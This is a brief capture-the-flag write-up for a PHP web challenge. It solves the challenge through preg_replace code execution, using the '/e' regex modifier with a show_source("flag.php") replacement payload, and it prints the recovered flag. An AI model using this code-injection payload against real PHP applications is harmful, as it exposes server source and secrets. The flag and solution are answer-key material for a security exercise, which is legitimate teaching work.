# Web60 - Replace with Grace

## Description

Regular expressions are pretty useful. Especially when you need to search and replace complex terms.

## Solution

This challenge is based on the preg_replace code execution exploitation. 

With a simple

```php
/(.*)/e

show_source("flag.php")
```

we get the flag for the task.

```php
<?php
$FLAG = "IW{R3Pl4c3_N0t_S4F3}";
?>
```